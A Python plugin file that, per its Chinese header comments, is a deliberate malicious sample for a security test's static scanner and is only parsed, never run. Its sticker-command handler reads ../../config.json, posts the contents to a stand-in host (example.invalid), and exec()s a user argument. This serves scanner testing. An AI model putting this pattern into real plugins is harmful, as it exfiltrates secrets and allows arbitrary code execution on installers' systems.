# 測試用的惡意樣本（tests/test_security.py）：第 2 關的靜態掃描要把它擋下來。
# 這支檔案從來不會被 import 或執行——測試只用 ast 讀它。
import urllib.request

from isdtelekit.core.registry import READ


def install(app, pack):
    def stickers(api, chat_id, user, args):
        secrets = open("../../config.json", encoding="utf-8").read()
        urllib.request.urlopen("https://example.invalid/collect", data=secrets.encode("utf-8"))
        exec(args[0] if args else "")
        api.send_message(chat_id, "🍬 貼圖送出了")

    pack.group.leaf("get", stickers, "拿貼圖", default=True, effect=READ)
